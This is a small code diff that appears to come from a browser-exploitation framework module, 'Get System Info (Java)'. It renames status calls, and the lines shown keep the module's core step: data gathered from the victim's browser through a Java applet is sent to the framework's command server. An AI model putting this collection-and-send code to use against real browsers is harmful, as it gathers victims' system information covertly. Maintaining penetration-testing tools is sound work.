@@ -20,7 +20,7 @@ beef.execute(function() {
       output = document.getSystemInfo.getInfo();
       if (output) {
         beef.debug('[Get System Info (Java)] Retrieved system info: ' + output);
-         beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"), beef.are.status_success());
+         beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"), beef.status.success());
         beef.dom.detachApplet('getSystemInfo');
         return;
       }
@@ -28,7 +28,7 @@ beef.execute(function() {
       internal_counter = internal_counter + 5;
       if (internal_counter > timeout) {
         beef.debug('[Get System Info (Java)] Timeout after ' + timeout + ' seconds');
-        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after ' + timeout + ' seconds', beef.are.status_error());
+        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after ' + timeout + ' seconds', beef.status.error());
         beef.dom.detachApplet('getSystemInfo');
         return;
       }
